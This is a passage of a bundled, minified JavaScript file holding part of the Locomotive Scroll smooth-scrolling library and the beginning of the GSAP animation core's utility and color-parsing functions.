                            break;
                          default:
                            c =
                              (s[e.directionAxis] - l.middle[e.directionAxis]) *
                              -l.speed;
                        }
                      l.sticky &&
                        (c = l.inView
                          ? "horizontal" === e.direction
                            ? e.instance.scroll.x - l.left + window.innerWidth
                            : e.instance.scroll.y - l.top + window.innerHeight
                          : "horizontal" === e.direction
                          ? e.instance.scroll.x < l.left - window.innerWidth &&
                            e.instance.scroll.x < l.left - window.innerWidth / 2
                            ? 0
                            : e.instance.scroll.x > l.right &&
                              e.instance.scroll.x > l.right + 100 &&
                              l.right - l.left + window.innerWidth
                          : e.instance.scroll.y < l.top - window.innerHeight &&
                            e.instance.scroll.y < l.top - window.innerHeight / 2
                          ? 0
                          : e.instance.scroll.y > l.bottom &&
                            e.instance.scroll.y > l.bottom + 100 &&
                            l.bottom - l.top + window.innerHeight),
                        !1 !== c &&
                          ("horizontal" === l.direction ||
                          ("horizontal" === e.direction &&
                            "vertical" !== l.direction)
                            ? e.transform(l.el, c, 0, !t && l.delay)
                            : e.transform(l.el, 0, c, !t && l.delay));
                    });
                  },
                },
                {
                  key: "scrollTo",
                  value: function (t) {
                    var e = this,
                      i =
                        arguments.length > 1 && void 0 !== arguments[1]
                          ? arguments[1]
                          : {},
                      n = parseInt(i.offset) || 0,
                      r = isNaN(parseInt(i.duration))
                        ? 1e3
                        : parseInt(i.duration),
                      s = i.easing || [0.25, 0, 0.35, 1],
                      o = !!i.disableLerp,
                      a = !!i.callback && i.callback;
                    if (((s = _t.apply(void 0, b(s))), "string" == typeof t)) {
                      if ("top" === t) t = 0;
                      else if ("bottom" === t) t = this.instance.limit.y;
                      else if ("left" === t) t = 0;
                      else if ("right" === t) t = this.instance.limit.x;
                      else if (!(t = document.querySelector(t))) return;
                    } else if ("number" == typeof t) t = parseInt(t);
                    else if (!t || !t.tagName)
                      return void console.warn(
                        "`target` parameter is not valid"
                      );
                    if ("number" != typeof t) {
                      if (!it(t).includes(this.el)) return;
                      var l = t.getBoundingClientRect(),
                        c = l.top,
                        u = l.left,
                        h = it(t).find(function (t) {
                          return Object.entries(e.sections)
                            .map(function (t) {
                              var e = y(t, 2);
                              return e[0], e[1];
                            })
                            .find(function (e) {
                              return e.el == t;
                            });
                        }),
                        f = 0;
                      (f = h
                        ? et(h)[this.directionAxis]
                        : -this.instance.scroll[this.directionAxis]),
                        (n =
                          "horizontal" === this.direction
                            ? u + n - f
                            : c + n - f);
                    } else n = t + n;
                    var d = parseFloat(this.instance.delta[this.directionAxis]),
                      p =
                        Math.max(
                          0,
                          Math.min(n, this.instance.limit[this.directionAxis])
                        ) - d,
                      m = function (t) {
                        o
                          ? "horizontal" === e.direction
                            ? e.setScroll(d + p * t, e.instance.delta.y)
                            : e.setScroll(e.instance.delta.x, d + p * t)
                          : (e.instance.delta[e.directionAxis] = d + p * t);
                      };
                    (this.animatingScroll = !0),
                      this.stopScrolling(),
                      this.startScrolling();
                    var g = Date.now();
                    !(function t() {
                      var i = (Date.now() - g) / r;
                      i > 1
                        ? (m(1),
                          (e.animatingScroll = !1),
                          0 == r && e.update(),
                          a && a())
                        : ((e.scrollToRaf = requestAnimationFrame(t)), m(s(i)));
                    })();
                  },
                },
                {
                  key: "update",
                  value: function () {
                    this.setScrollLimit(),
                      this.addSections(),
                      this.addElements(),
                      this.detectElements(),
                      this.updateScroll(),
                      this.transformElements(!0),
                      this.reinitScrollBar(),
                      this.checkScroll(!0);
                  },
                },
                {
                  key: "startScroll",
                  value: function () {
                    this.stop = !1;
                  },
                },
                {
                  key: "stopScroll",
                  value: function () {
                    this.stop = !0;
                  },
                },
                {
                  key: "setScroll",
                  value: function (t, e) {
                    this.instance = c(
                      c({}, this.instance),
                      {},
                      {
                        scroll: { x: t, y: e },
                        delta: { x: t, y: e },
                        speed: 0,
                      }
                    );
                  },
                },
                {
                  key: "destroy",
                  value: function () {
                    _(h(i.prototype), "destroy", this).call(this),
                      this.stopScrolling(),
                      this.html.classList.remove(this.smoothClass),
                      this.vs.destroy(),
                      this.destroyScrollBar(),
                      window.removeEventListener("keydown", this.checkKey, !1);
                  },
                },
              ]),
              i
            );
          })(C),
          wt = (function () {
            function t() {
              var e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : {};
              r(this, t),
                (this.options = e),
                Object.assign(this, P, e),
                (this.smartphone = P.smartphone),
                e.smartphone && Object.assign(this.smartphone, e.smartphone),
                (this.tablet = P.tablet),
                e.tablet && Object.assign(this.tablet, e.tablet),
                this.smooth ||
                  "horizontal" != this.direction ||
                  console.warn(
                    "🚨 `smooth:false` & `horizontal` direction are not yet compatible"
                  ),
                this.tablet.smooth ||
                  "horizontal" != this.tablet.direction ||
                  console.warn(
                    "🚨 `smooth:false` & `horizontal` direction are not yet compatible (tablet)"
                  ),
                this.smartphone.smooth ||
                  "horizontal" != this.smartphone.direction ||
                  console.warn(
                    "🚨 `smooth:false` & `horizontal` direction are not yet compatible (smartphone)"
                  ),
                this.init();
            }
            return (
              o(t, [
                {
                  key: "init",
                  value: function () {
                    if (
                      ((this.options.isMobile =
                        /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
                          navigator.userAgent
                        ) ||
                        ("MacIntel" === navigator.platform &&
                          navigator.maxTouchPoints > 1) ||
                        window.innerWidth < this.tablet.breakpoint),
                      (this.options.isTablet =
                        this.options.isMobile &&
                        window.innerWidth >= this.tablet.breakpoint),
                      (this.smooth && !this.options.isMobile) ||
                      (this.tablet.smooth && this.options.isTablet) ||
                      (this.smartphone.smooth &&
                        this.options.isMobile &&
                        !this.options.isTablet)
                        ? (this.scroll = new bt(this.options))
                        : (this.scroll = new L(this.options)),
                      this.scroll.init(),
                      window.location.hash)
                    ) {
                      var t = window.location.hash.slice(
                          1,
                          window.location.hash.length
                        ),
                        e = document.getElementById(t);
                      e && this.scroll.scrollTo(e);
                    }
                  },
                },
                {
                  key: "update",
                  value: function () {
                    this.scroll.update();
                  },
                },
                {
                  key: "start",
                  value: function () {
                    this.scroll.startScroll();
                  },
                },
                {
                  key: "stop",
                  value: function () {
                    this.scroll.stopScroll();
                  },
                },
                {
                  key: "scrollTo",
                  value: function (t, e) {
                    this.scroll.scrollTo(t, e);
                  },
                },
                {
                  key: "setScroll",
                  value: function (t, e) {
                    this.scroll.setScroll(t, e);
                  },
                },
                {
                  key: "on",
                  value: function (t, e) {
                    this.scroll.setEvents(t, e);
                  },
                },
                {
                  key: "off",
                  value: function (t, e) {
                    this.scroll.unsetEvents(t, e);
                  },
                },
                {
                  key: "destroy",
                  value: function () {
                    this.scroll.destroy();
                  },
                },
              ]),
              t
            );
          })();
        i.Smooth = wt;
        var xt = (function () {
          function t() {
            var e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : {};
            r(this, t),
              (this.options = e),
              Object.assign(this, P, e),
              (this.smartphone = P.smartphone),
              e.smartphone && Object.assign(this.smartphone, e.smartphone),
              (this.tablet = P.tablet),
              e.tablet && Object.assign(this.tablet, e.tablet),
              this.init();
          }
          return (
            o(t, [
              {
                key: "init",
                value: function () {
                  if (
                    ((this.scroll = new L(this.options)),
                    this.scroll.init(),
                    window.location.hash)
                  ) {
                    var t = window.location.hash.slice(
                        1,
                        window.location.hash.length
                      ),
                      e = document.getElementById(t);
                    e && this.scroll.scrollTo(e);
                  }
                },
              },
              {
                key: "update",
                value: function () {
                  this.scroll.update();
                },
              },
              {
                key: "start",
                value: function () {
                  this.scroll.startScroll();
                },
              },
              {
                key: "stop",
                value: function () {
                  this.scroll.stopScroll();
                },
              },
              {
                key: "scrollTo",
                value: function (t, e) {
                  this.scroll.scrollTo(t, e);
                },
              },
              {
                key: "setScroll",
                value: function (t, e) {
                  this.scroll.setScroll(t, e);
                },
              },
              {
                key: "on",
                value: function (t, e) {
                  this.scroll.setEvents(t, e);
                },
              },
              {
                key: "off",
                value: function (t, e) {
                  this.scroll.unsetEvents(t, e);
                },
              },
              {
                key: "destroy",
                value: function () {
                  this.scroll.destroy();
                },
              },
            ]),
            t
          );
        })();
        i.Native = xt;
        var Tt = wt;
        i.default = Tt;
      },
      {},
    ],
    TNS6: [
      function (t, e, i) {
        "use strict";
        function n(t) {
          if (void 0 === t)
            throw new ReferenceError(
              "this hasn't been initialised - super() hasn't been called"
            );
          return t;
        }
        function r(t, e) {
          (t.prototype = Object.create(e.prototype)),
            (t.prototype.constructor = t),
            (t.__proto__ = e);
        }
        Object.defineProperty(i, "__esModule", { value: !0 }),
          (i._colorExp =
            i._getCache =
            i._getSetter =
            i._missingPlugin =
            i._round =
            i._roundModifier =
            i._config =
            i._ticker =
            i._plugins =
            i._checkPlugin =
            i._replaceRandom =
            i._colorStringFilter =
            i._sortPropTweensByPriority =
            i._forEachName =
            i._removeLinkedListItem =
            i._setDefaults =
            i._relExp =
            i._renderComplexString =
            i._isUndefined =
            i._isString =
            i._numWithUnitExp =
            i._numExp =
            i._getProperty =
            i.shuffle =
            i.interpolate =
            i.unitize =
            i.pipe =
            i.mapRange =
            i.selector =
            i.toArray =
            i.splitColor =
            i.clamp =
            i.getUnit =
            i.normalize =
            i.snap =
            i.random =
            i.distribute =
            i.wrapYoyo =
            i.wrap =
            i.Circ =
            i.Expo =
            i.Sine =
            i.Bounce =
            i.SteppedEase =
            i.Back =
            i.Elastic =
            i.Strong =
            i.Quint =
            i.Quart =
            i.Cubic =
            i.Quad =
            i.Linear =
            i.Power4 =
            i.Power3 =
            i.Power2 =
            i.Power1 =
            i.Power0 =
            i.default =
            i.gsap =
            i.PropTween =
            i.TweenLite =
            i.TweenMax =
            i.Tween =
            i.TimelineLite =
            i.TimelineMax =
            i.Timeline =
            i.Animation =
            i.GSCache =
              void 0);
        var s,
          o,
          a,
          l,
          c,
          u,
          h,
          f,
          d,
          p = {
            autoSleep: 120,
            force3D: "auto",
            nullTargetWarn: 1,
            units: { lineHeight: "" },
          },
          m = { duration: 0.5, overwrite: !1, delay: 0 },
          g = 1e8,
          v = 1 / g,
          _ = 2 * Math.PI,
          y = _ / 4,
          b = 0,
          w = Math.sqrt,
          x = Math.cos,
          T = Math.sin,
          S = function (t) {
            return "string" == typeof t;
          },
          k = function (t) {
            return "function" == typeof t;
          },
          O = function (t) {
            return "number" == typeof t;
          },
          E = function (t) {
            return void 0 === t;
          },
          A = function (t) {
            return "object" == typeof t;
          },
          P = function (t) {
            return !1 !== t;
          },
          C = function () {
            return "undefined" != typeof window;
          },
          M = function (t) {
            return k(t) || S(t);
          },
          j =
            ("function" == typeof ArrayBuffer && ArrayBuffer.isView) ||
            function () {},
          D = Array.isArray,
          L = /(?:-?\.?\d|\.)+/gi,
          B = /[-+=.]*\d+[.e\-+]*\d*[e\-+]*\d*/g,
          R = /[-+=.]*\d+[.e-]*\d*[a-z%]*/g,
          I = /[-+=.]*\d+\.?\d*(?:e-|e\+)?\d*/gi,
          z = /[+-]=-?[.\d]+/,
          F = /[^,'"\[\]\s]+/gi,
          W = /[\d.+\-=]+(?:e[-+]\d*)*/i,
          Y = {},
          N = {},
          H = function (t) {
            return (N = pt(t, Y)) && li;
          },
          X = function (t, e) {
            return console.warn(
              "Invalid property",
              t,
              "set to",
              e,
              "Missing plugin? gsap.registerPlugin()"
            );
          },
          U = function (t, e) {
            return !e && console.warn(t);
          },
          q = function (t, e) {
            return (t && (Y[t] = e) && N && (N[t] = e)) || Y;
          },
          V = function () {
            return 0;
          },
          G = {},
          K = [],
          Q = {},
          Z = {},
          $ = {},
          J = 30,
          tt = [],
          et = "",
          it = function (t) {
            var e,
              i,
              n = t[0];
            if ((A(n) || k(n) || (t = [t]), !(e = (n._gsap || {}).harness))) {
              for (i = tt.length; i-- && !tt[i].targetTest(n); );
              e = tt[i];
            }
            for (i = t.length; i--; )
              (t[i] && (t[i]._gsap || (t[i]._gsap = new De(t[i], e)))) ||
                t.splice(i, 1);
            return t;
          },
          nt = function (t) {
            return t._gsap || it(Ut(t))[0]._gsap;
          },
          rt = function (t, e, i) {
            return (i = t[e]) && k(i)
              ? t[e]()
              : (E(i) && t.getAttribute && t.getAttribute(e)) || i;
          },
          st = function (t, e) {
            return (t = t.split(",")).forEach(e) || t;
          },
          ot = function (t) {
            return Math.round(1e5 * t) / 1e5 || 0;
          },
          at = function (t, e) {
            for (var i = e.length, n = 0; t.indexOf(e[n]) < 0 && ++n < i; );
            return n < i;
          },
          lt = function () {
            var t,
              e,
              i = K.length,
              n = K.slice(0);
            for (Q = {}, K.length = 0, t = 0; t < i; t++)
              (e = n[t]) &&
                e._lazy &&
                (e.render(e._lazy[0], e._lazy[1], !0)._lazy = 0);
          },
          ct = function (t, e, i, n) {
            K.length && lt(), t.render(e, i, n), K.length && lt();
          },
          ut = function (t) {
            var e = parseFloat(t);
            return (e || 0 === e) && (t + "").match(F).length < 2
              ? e
              : S(t)
              ? t.trim()
              : t;
          },
          ht = function (t) {
            return t;
          },
          ft = function (t, e) {
            for (var i in e) i in t || (t[i] = e[i]);
            return t;
          },
          dt = function (t, e) {
            for (var i in e)
              i in t || "duration" === i || "ease" === i || (t[i] = e[i]);
          },
          pt = function (t, e) {
            for (var i in e) t[i] = e[i];
            return t;
          },
          mt = function t(e, i) {
            for (var n in i)
              "__proto__" !== n &&
                "constructor" !== n &&
                "prototype" !== n &&
                (e[n] = A(i[n]) ? t(e[n] || (e[n] = {}), i[n]) : i[n]);
            return e;
          },
          gt = function (t, e) {
            var i,
              n = {};
            for (i in t) i in e || (n[i] = t[i]);
            return n;
          },
          vt = function (t) {
            var e = t.parent || o,
              i = t.keyframes ? dt : ft;
            if (P(t.inherit))
              for (; e; ) i(t, e.vars.defaults), (e = e.parent || e._dp);
            return t;
          },
          _t = function (t, e, i, n) {
            void 0 === i && (i = "_first"), void 0 === n && (n = "_last");
            var r = e._prev,
              s = e._next;
            r ? (r._next = s) : t[i] === e && (t[i] = s),
              s ? (s._prev = r) : t[n] === e && (t[n] = r),
              (e._next = e._prev = e.parent = null);
          },
          yt = function (t, e) {
            t.parent &&
              (!e || t.parent.autoRemoveChildren) &&
              t.parent.remove(t),
              (t._act = 0);
          },
          bt = function (t, e) {
            if (t && (!e || e._end > t._dur || e._start < 0))
              for (var i = t; i; ) (i._dirty = 1), (i = i.parent);
            return t;
          },
          wt = function (t) {
            for (var e = t.parent; e && e.parent; )
              (e._dirty = 1), e.totalDuration(), (e = e.parent);
            return t;
          },
          xt = function t(e) {
            return !e || (e._ts && t(e.parent));
          },
          Tt = function (t) {
            return t._repeat
              ? St(t._tTime, (t = t.duration() + t._rDelay)) * t
              : 0;
          },
          St = function (t, e) {
            var i = Math.floor((t /= e));
            return t && i === t ? i - 1 : i;
          },
          kt = function (t, e) {
            return (
              (t - e._start) * e._ts +
              (e._ts >= 0 ? 0 : e._dirty ? e.totalDuration() : e._tDur)
            );
          },
          Ot = function (t) {
            return (t._end = ot(
              t._start + (t._tDur / Math.abs(t._ts || t._rts || v) || 0)
            ));
          },
          Et = function (t, e) {
            var i = t._dp;
            return (
              i &&
                i.smoothChildTiming &&
                t._ts &&
                ((t._start = ot(
                  i._time -
                    (t._ts > 0
                      ? e / t._ts
                      : ((t._dirty ? t.totalDuration() : t._tDur) - e) / -t._ts)
                )),
                Ot(t),
                i._dirty || bt(i, t)),
              t
            );
          },
          At = function (t, e) {
            var i;
            if (
              ((e._time || (e._initted && !e._dur)) &&
                ((i = kt(t.rawTime(), e)),
                (!e._dur || Wt(0, e.totalDuration(), i) - e._tTime > v) &&
                  e.render(i, !0)),
              bt(t, e)._dp && t._initted && t._time >= t._dur && t._ts)
            ) {
              if (t._dur < t.duration())
                for (i = t; i._dp; )
                  i.rawTime() >= 0 && i.totalTime(i._tTime), (i = i._dp);
              t._zTime = -v;
            }
          },
          Pt = function (t, e, i, n) {
            return (
              e.parent && yt(e),
              (e._start = ot(
                (O(i) ? i : i || t !== o ? It(t, i, e) : t._time) + e._delay
              )),
              (e._end = ot(
                e._start + (e.totalDuration() / Math.abs(e.timeScale()) || 0)
              )),
              (function (t, e, i, n, r) {
                void 0 === i && (i = "_first"), void 0 === n && (n = "_last");
                var s,
                  o = t[n];
                if (r) for (s = e[r]; o && o[r] > s; ) o = o._prev;
                o
                  ? ((e._next = o._next), (o._next = e))
                  : ((e._next = t[i]), (t[i] = e)),
                  e._next ? (e._next._prev = e) : (t[n] = e),
                  (e._prev = o),
                  (e.parent = e._dp = t);
              })(t, e, "_first", "_last", t._sort ? "_start" : 0),
              Dt(e) || (t._recent = e),
              n || At(t, e),
              t
            );
          },
          Ct = function (t, e) {
            return (
              (Y.ScrollTrigger || X("scrollTrigger", e)) &&
              Y.ScrollTrigger.create(e, t)
            );
          },
          Mt = function (t, e, i, n) {
            return (
              We(t, e),
              t._initted
                ? !i &&
                  t._pt &&
                  ((t._dur && !1 !== t.vars.lazy) ||
                    (!t._dur && t.vars.lazy)) &&
                  h !== be.frame
                  ? (K.push(t), (t._lazy = [e, n]), 1)
                  : void 0
                : 1
            );
          },
          jt = function t(e) {
            var i = e.parent;
            return (
              i && i._ts && i._initted && !i._lock && (i.rawTime() < 0 || t(i))
            );
          },
          Dt = function (t) {
            var e = t.data;
            return "isFromStart" === e || "isStart" === e;
          },
          Lt = function (t, e, i, n) {
            var r = t._repeat,
              s = ot(e) || 0,
              o = t._tTime / t._tDur;
            return (
              o && !n && (t._time *= s / t._dur),
              (t._dur = s),
              (t._tDur = r
                ? r < 0
                  ? 1e10
                  : ot(s * (r + 1) + t._rDelay * r)
                : s),
              o && !n ? Et(t, (t._tTime = t._tDur * o)) : t.parent && Ot(t),
              i || bt(t.parent, t),
              t
            );
          },
          Bt = function (t) {
            return t instanceof Be ? bt(t) : Lt(t, t._dur);
          },
          Rt = { _start: 0, endTime: V, totalDuration: V },
          It = function t(e, i, n) {
            var r,
              s,
              o,
              a = e.labels,
              l = e._recent || Rt,
              c = e.duration() >= g ? l.endTime(!1) : e._dur;
            return S(i) && (isNaN(i) || i in a)
              ? ((s = i.charAt(0)),
                (o = "%" === i.substr(-1)),
                (r = i.indexOf("=")),
                "<" === s || ">" === s
                  ? (r >= 0 && (i = i.replace(/=/, "")),
                    ("<" === s ? l._start : l.endTime(l._repeat >= 0)) +
                      (parseFloat(i.substr(1)) || 0) *
                        (o ? (r < 0 ? l : n).totalDuration() / 100 : 1))
                  : r < 0
                  ? (i in a || (a[i] = c), a[i])
                  : ((s = parseFloat(i.charAt(r - 1) + i.substr(r + 1))),
                    o &&
                      n &&
                      (s = (s / 100) * (D(n) ? n[0] : n).totalDuration()),
                    r > 1 ? t(e, i.substr(0, r - 1), n) + s : c + s))
              : null == i
              ? c
              : +i;
          },
          zt = function (t, e, i) {
            var n,
              r,
              s = O(e[1]),
              o = (s ? 2 : 1) + (t < 2 ? 0 : 1),
              a = e[o];
            if ((s && (a.duration = e[1]), (a.parent = i), t)) {
              for (n = a, r = i; r && !("immediateRender" in n); )
                (n = r.vars.defaults || {}),
                  (r = P(r.vars.inherit) && r.parent);
              (a.immediateRender = P(n.immediateRender)),
                t < 2 ? (a.runBackwards = 1) : (a.startAt = e[o - 1]);
            }
            return new Xe(e[0], a, e[o + 1]);
          },
          Ft = function (t, e) {
            return t || 0 === t ? e(t) : e;
          },
          Wt = function (t, e, i) {
            return i < t ? t : i > e ? e : i;
          },
          Yt = function (t) {
            if ("string" != typeof t) return "";
            var e = W.exec(t);
            return e ? t.substr(e.index + e[0].length) : "";
          },
          Nt = function (t, e, i) {
            return Ft(i, function (i) {
              return Wt(t, e, i);
            });
          },
          Ht = [].slice,
          Xt = function (t, e) {
            return (
              t &&
              A(t) &&
              "length" in t &&
              ((!e && !t.length) || (t.length - 1 in t && A(t[0]))) &&
              !t.nodeType &&
              t !== a
            );
          },
          Ut = function (t, e, i) {
            return !S(t) || i || (!l && we())
              ? D(t)
                ? (function (t, e, i) {
                    return (
                      void 0 === i && (i = []),
                      t.forEach(function (t) {
                        var n;
                        return (S(t) && !e) || Xt(t, 1)
                          ? (n = i).push.apply(n, Ut(t))
                          : i.push(t);
                      }) || i
                    );
                  })(t, i)
                : Xt(t)
                ? Ht.call(t, 0)
                : t
                ? [t]
                : []
              : Ht.call((e || c).querySelectorAll(t), 0);
          },
          qt = function (t) {
            return (
              (t = Ut(t)[0] || U("Invalid scope") || {}),
              function (e) {
                var i = t.current || t.nativeElement || t;
                return Ut(
                  e,
                  i.querySelectorAll
                    ? i
                    : i === t
                    ? U("Invalid scope") || c.createElement("div")
                    : t
                );
              }
            );
          },
          Vt = function (t) {
            return t.sort(function () {
              return 0.5 - Math.random();
            });
          },
          Gt = function (t) {
            if (k(t)) return t;
            var e = A(t) ? t : { each: t },
              i = Ae(e.ease),
              n = e.from || 0,
              r = parseFloat(e.base) || 0,
              s = {},
              o = n > 0 && n < 1,
              a = isNaN(n) || o,
              l = e.axis,
              c = n,
              u = n;
            return (
              S(n)
                ? (c = u = { center: 0.5, edges: 0.5, end: 1 }[n] || 0)
                : !o && a && ((c = n[0]), (u = n[1])),
              function (t, o, h) {
                var f,
                  d,
                  p,
                  m,
                  v,
                  _,
                  y,
                  b,
                  x,
                  T = (h || e).length,
                  S = s[T];
                if (!S) {
                  if (!(x = "auto" === e.grid ? 0 : (e.grid || [1, g])[1])) {
                    for (
                      y = -g;
                      y < (y = h[x++].getBoundingClientRect().left) && x < T;

                    );
                    x--;
                  }
                  for (
                    S = s[T] = [],
                      f = a ? Math.min(x, T) * c - 0.5 : n % x,
                      d = a ? (T * u) / x - 0.5 : (n / x) | 0,
                      y = 0,
                      b = g,
                      _ = 0;
                    _ < T;
                    _++
                  )
                    (p = (_ % x) - f),
                      (m = d - ((_ / x) | 0)),
                      (S[_] = v =
                        l ? Math.abs("y" === l ? m : p) : w(p * p + m * m)),
                      v > y && (y = v),
                      v < b && (b = v);
                  "random" === n && Vt(S),
                    (S.max = y - b),
                    (S.min = b),
                    (S.v = T =
                      (parseFloat(e.amount) ||
                        parseFloat(e.each) *
                          (x > T
                            ? T - 1
                            : l
                            ? "y" === l
                              ? T / x
                              : x
                            : Math.max(x, T / x)) ||
                        0) * ("edges" === n ? -1 : 1)),
                    (S.b = T < 0 ? r - T : r),
                    (S.u = Yt(e.amount || e.each) || 0),
                    (i = i && T < 0 ? Oe(i) : i);
                }
                return (
                  (T = (S[t] - S.min) / S.max || 0),
                  ot(S.b + (i ? i(T) : T) * S.v) + S.u
                );
              }
            );
          },
          Kt = function (t) {
            var e = t < 1 ? Math.pow(10, (t + "").length - 2) : 1;
            return function (i) {
              var n = Math.round(parseFloat(i) / t) * t * e;
              return (n - (n % 1)) / e + (O(i) ? 0 : Yt(i));
            };
          },
          Qt = function (t, e) {
            var i,
              n,
              r = D(t);
            return (
              !r &&
                A(t) &&
                ((i = r = t.radius || g),
                t.values
                  ? ((t = Ut(t.values)), (n = !O(t[0])) && (i *= i))
                  : (t = Kt(t.increment))),
              Ft(
                e,
                r
                  ? k(t)
                    ? function (e) {
                        return (n = t(e)), Math.abs(n - e) <= i ? n : e;
                      }
                    : function (e) {
                        for (
                          var r,
                            s,
                            o = parseFloat(n ? e.x : e),
                            a = parseFloat(n ? e.y : 0),
                            l = g,
                            c = 0,
                            u = t.length;
                          u--;

                        )
                          (r = n
                            ? (r = t[u].x - o) * r + (s = t[u].y - a) * s
                            : Math.abs(t[u] - o)) < l && ((l = r), (c = u));
                        return (
                          (c = !i || l <= i ? t[c] : e),
                          n || c === e || O(e) ? c : c + Yt(e)
                        );
                      }
                  : Kt(t)
              )
            );
          },
          Zt = function (t, e, i, n) {
            return Ft(D(t) ? !e : !0 === i ? !!(i = 0) : !n, function () {
              return D(t)
                ? t[~~(Math.random() * t.length)]
                : (i = i || 1e-5) &&
                    (n = i < 1 ? Math.pow(10, (i + "").length - 2) : 1) &&
                    Math.floor(
                      Math.round(
                        (t - i / 2 + Math.random() * (e - t + 0.99 * i)) / i
                      ) *
                        i *
                        n
                    ) / n;
            });
          },
          $t = function () {
            for (var t = arguments.length, e = new Array(t), i = 0; i < t; i++)
              e[i] = arguments[i];
            return function (t) {
              return e.reduce(function (t, e) {
                return e(t);
              }, t);
            };
          },
          Jt = function (t, e) {
            return function (i) {
              return t(parseFloat(i)) + (e || Yt(i));
            };
          },
          te = function (t, e, i) {
            return se(t, e, 0, 1, i);
          },
          ee = function (t, e, i) {
            return Ft(i, function (i) {
              return t[~~e(i)];
            });
          },
          ie = function t(e, i, n) {
            var r = i - e;
            return D(e)
              ? ee(e, t(0, e.length), i)
              : Ft(n, function (t) {
                  return ((r + ((t - e) % r)) % r) + e;
                });
          },
          ne = function t(e, i, n) {
            var r = i - e,
              s = 2 * r;
            return D(e)
              ? ee(e, t(0, e.length - 1), i)
              : Ft(n, function (t) {
                  return (
                    e + ((t = (s + ((t - e) % s)) % s || 0) > r ? s - t : t)
                  );
                });
          },
          re = function (t) {
            for (
              var e, i, n, r, s = 0, o = "";
              ~(e = t.indexOf("random(", s));

            )
              (n = t.indexOf(")", e)),
                (r = "[" === t.charAt(e + 7)),
                (i = t.substr(e + 7, n - e - 7).match(r ? F : L)),
                (o +=
                  t.substr(s, e - s) +
                  Zt(r ? i : +i[0], r ? 0 : +i[1], +i[2] || 1e-5)),
                (s = n + 1);
            return o + t.substr(s, t.length - s);
          },
          se = function (t, e, i, n, r) {
            var s = e - t,
              o = n - i;
            return Ft(r, function (e) {
              return i + (((e - t) / s) * o || 0);
            });
          },
          oe = function t(e, i, n, r) {
            var s = isNaN(e + i)
              ? 0
              : function (t) {
                  return (1 - t) * e + t * i;
                };
            if (!s) {
              var o,
                a,
                l,
                c,
                u,
                h = S(e),
                f = {};
              if ((!0 === n && (r = 1) && (n = null), h))
                (e = { p: e }), (i = { p: i });
              else if (D(e) && !D(i)) {
                for (l = [], c = e.length, u = c - 2, a = 1; a < c; a++)
                  l.push(t(e[a - 1], e[a]));
                c--,
                  (s = function (t) {
                    t *= c;
                    var e = Math.min(u, ~~t);
                    return l[e](t - e);
                  }),
                  (n = i);
              } else r || (e = pt(D(e) ? [] : {}, e));
              if (!l) {
                for (o in i) ze.call(f, e, o, "get", i[o]);
                s = function (t) {
                  return Je(t, f) || (h ? e.p : e);
                };
              }
            }
            return Ft(n, s);
          },
          ae = function (t, e, i) {
            var n,
              r,
              s,
              o = t.labels,
              a = g;
            for (n in o)
              (r = o[n] - e) < 0 == !!i &&
                r &&
                a > (r = Math.abs(r)) &&
                ((s = n), (a = r));
            return s;
          },
          le = function (t, e, i) {
            var n,
              r,
              s = t.vars,
              o = s[e];
            if (o)
              return (
                (n = s[e + "Params"]),
                (r = s.callbackScope || t),
                i && K.length && lt(),
                n ? o.apply(r, n) : o.call(r)
              );
          },
          ce = function (t) {
            return (
              yt(t),
              t.scrollTrigger && t.scrollTrigger.kill(!1),
              t.progress() < 1 && le(t, "onInterrupt"),
              t
            );
          },
          ue = function (t) {
            var e = (t = (!t.name && t.default) || t).name,
              i = k(t),
              n =
                e && !i && t.init
                  ? function () {
                      this._props = [];
                    }
                  : t,
              r = {
                init: V,
                render: Je,
                add: ze,
                kill: ei,
                modifier: ti,
                rawVars: 0,
              },
              s = {
                targetTest: 0,
                get: 0,
                getSetter: Ke,
                aliases: {},
                register: 0,
              };
            if ((we(), t !== n)) {
              if (Z[e]) return;
              ft(n, ft(gt(t, r), s)),
                pt(n.prototype, pt(r, gt(t, s))),
                (Z[(n.prop = e)] = n),
                t.targetTest && (tt.push(n), (G[e] = 1)),
                (e =
                  ("css" === e
                    ? "CSS"
                    : e.charAt(0).toUpperCase() + e.substr(1)) + "Plugin");
            }
            q(e, n), t.register && t.register(li, n, ri);
          },
          he = 255,
          fe = {
            aqua: [0, he, he],
            lime: [0, he, 0],
            silver: [192, 192, 192],
            black: [0, 0, 0],
            maroon: [128, 0, 0],
            teal: [0, 128, 128],
            blue: [0, 0, he],
            navy: [0, 0, 128],
            white: [he, he, he],
            olive: [128, 128, 0],
            yellow: [he, he, 0],
            orange: [he, 165, 0],
            gray: [128, 128, 128],
            purple: [128, 0, 128],
            green: [0, 128, 0],
            red: [he, 0, 0],
            pink: [he, 192, 203],
            cyan: [0, he, he],
            transparent: [he, he, he, 0],
          },
          de = function (t, e, i) {
            return (
              ((6 * (t = t < 0 ? t + 1 : t > 1 ? t - 1 : t) < 1
                ? e + (i - e) * t * 6
                : t < 0.5
                ? i
                : 3 * t < 2
                ? e + (i - e) * (2 / 3 - t) * 6
                : e) *
                he +
                0.5) |
              0
            );
          },
          pe = function (t, e, i) {
            var n,
              r,
              s,
              o,
              a,
              l,
              c,
              u,
              h,
              f,
              d = t ? (O(t) ? [t >> 16, (t >> 8) & he, t & he] : 0) : fe.black;
            if (!d) {
              if (
                ("," === t.substr(-1) && (t = t.substr(0, t.length - 1)), fe[t])
              )
                d = fe[t];
              else if ("#" === t.charAt(0)) {
                if (
                  (t.length < 6 &&
                    ((n = t.charAt(1)),
                    (r = t.charAt(2)),
                    (s = t.charAt(3)),
                    (t =
                      "#" +
                      n +
                      n +
                      r +
                      r +
                      s +
                      s +
                      (5 === t.length ? t.charAt(4) + t.charAt(4) : ""))),
                  9 === t.length)
                )
                  return [
                    (d = parseInt(t.substr(1, 6), 16)) >> 16,
                    (d >> 8) & he,
                    d & he,
                    parseInt(t.substr(7), 16) / 255,
                  ];
                d = [
                  (t = parseInt(t.substr(1), 16)) >> 16,
                  (t >> 8) & he,
                  t & he,
                ];
              } else if ("hsl" === t.substr(0, 3))
                if (((d = f = t.match(L)), e)) {
                  if (~t.indexOf("="))
                    return (d = t.match(B)), i && d.length < 4 && (d[3] = 1), d;
                } else
                  (o = (+d[0] % 360) / 360),
                    (a = +d[1] / 100),
                    (n =
                      2 * (l = +d[2] / 100) -
